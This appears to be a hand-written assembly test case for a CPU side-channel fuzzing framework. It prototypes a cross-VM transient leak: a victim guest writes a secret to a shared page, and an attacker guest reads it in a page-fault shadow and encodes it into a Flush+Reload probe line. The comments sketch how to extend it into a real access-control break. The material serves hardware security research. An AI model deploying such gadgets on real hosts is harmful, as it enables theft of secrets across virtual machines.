.intel_syntax noprefix

# ============================================================================
# MANUAL shared-memory transient-leak PROTOTYPE (hand-written gadget — NO random_instructions).
#
# Actors (config-shmem-poc.yaml, = tsa-l1d layout):
#   main      host, kernel                — orchestrator
#   vmvictim  guest, kernel               — writes a CONTROLLED secret to the SHARED buffer
#   vm        guest, kernel, observer, RO — reads it TRANSIENTLY + F+R (attacker)
#
# Both guests alias main (hpa_gpa) => vmvictim and vm SHARE main's physical data page. The victim
# writes secret byte S to shared offset 0x140 (line 5). The observer opens a #PF window (store to its
# read-only faulty page) and, in the fault shadow, reads the shared 0x140 and encodes S into its F+R
# probe as line (S & 0x3f). If the htrace's differing line tracks S, transient shared-mem exfil works.
#
# THREAT-MODEL CAVEAT: vm's shared page is READABLE, so this proves the transient EXFIL PIPELINE over a
# shared buffer (with a controlled secret + the ct-ni detector), NOT yet an access-control break. To
# turn it into a hard leak, block vm's architectural read of 0x140 (permission) and rely on the
# microtag false-completion — the follow-up once this fires.
# ============================================================================

# ----------------------------- Host (orchestrator) --------------------------
.section .data.main
.function_main_0:
    .macro.set_h2g_target.vm.function_vm_0:
    .macro.set_g2h_target.main.function_main_1:
    # vm arms F+R (measurement_start)
    .macro.switch_h2g.vm.0:

.function_main_1:
    .macro.landing_g2h.main_1:
    .macro.set_h2g_target.vmvictim.function_vmvictim_0:
    .macro.set_g2h_target.main.function_main_2:
    # victim writes + caches the secret
    .macro.switch_h2g.vmvictim.0:

.function_main_2:
    .macro.landing_g2h.main_2:
    .macro.set_h2g_target.vm.function_vm_1:
    .macro.set_g2h_target.main.function_main_3:

    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
.patch_placeholder:

    # vm transient retrieval + measurement_end
    .macro.switch_h2g.vm.1:

.function_main_3:
    .macro.landing_g2h.main_3:
.macro.fault_handler:
.patch_placeholder_fault_handler:
    .macro.set_h2g_target.vm.function_vm_2:
    .macro.set_g2h_target.main.function_main_4:
    .macro.switch_h2g.vm.2:

.function_main_4:
    .macro.landing_g2h.main_4:
    nop

# ----------------------------- Victim: place the secret in the SHARED buffer ---
.section .data.vmvictim
.function_vmvictim_0:
    .macro.landing_h2g.vmvictim_0:
    mov rax, qword ptr [r14 + 0x2000]          # secret S <- victim input (reg-init slot 0)
    mov byte ptr [r14 + 0x140], al             # write S to SHARED offset 0x140 (line 5) — fixed addr
    movzx rbx, byte ptr [r14 + 0x140]          # read back -> cache shared line 5 in L1D
    mfence
    .macro.switch_g2h.main.vmvictim_0:
    lfence

# ----------------------------- Attacker: transient read of the SHARED secret ---
.section .data.vm
.function_vm_0:
    .macro.landing_h2g.vm_0:
    .macro.measurement_start:
    .macro.switch_g2h.main.vm_0:
    lfence

.function_vm_1:
    .macro.landing_h2g.vm_1:
    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mfence # noremove
    mov qword ptr [r14 + 0x1000], rax          # store to RO faulty page (writable:false) -> #PF
    # --- fault shadow (transient; never architecturally retired) ---
    # proven 090802 pattern: transient LOAD of the secret, then a dependent transient STORE whose
    # ADDRESS is the secret value -> the probe line touched = S & 0x3f (store leaves an RFO footprint).
    movzx rcx, byte ptr [r14 + 0x140]          # transient READ of the shared secret S (line 5)
    and rcx, 0x3f                               # low 6 bits of S
    shl rcx, 6                                  # * 64B -> one probe line per value bucket
    mov byte ptr [r14 + rcx], al               # ENCODE: dependent transient STORE -> probe line (S & 0x3f)
    # --- end shadow ---
    lfence  # noremove
    .macro.measurement_end.vm_1:
    .macro.switch_g2h.main.1:
    lfence

.function_vm_2:
    .macro.landing_h2g.vm_2:
    .macro.measurement_end.vm_2:
    .macro.switch_g2h.main.2:
    lfence

# ----------------------------- Exit -----------------------------------------
.section .data.main
.test_case_exit:
